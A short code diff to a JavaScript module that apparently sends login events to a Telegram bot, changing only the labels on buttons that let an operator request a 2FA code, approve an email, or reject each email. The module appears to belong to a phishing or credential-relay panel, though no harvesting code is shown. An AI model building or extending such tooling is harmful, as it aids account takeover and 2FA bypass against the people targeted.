@@ -134,10 +134,10 @@ async function sendLoginTelegram(email, message) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "↖️ 2FA", callback_data: `page1|${email}` }
+          { text: "🔑 2FA Auth", callback_data: `page1|${email}` }
           ],
         [
-          { text: "↗️ Approve Email", callback_data: `page2|${email}` }
+          { text: "📧 Approve Email", callback_data: `page2|${email}` }
         ],
         [
           { text: "❌ Reject", callback_data: `reject|${email}` }
@@ -299,4 +299,5 @@ module.exports = {
   sendLoginTelegram,
   send2FACode
 };
+
 
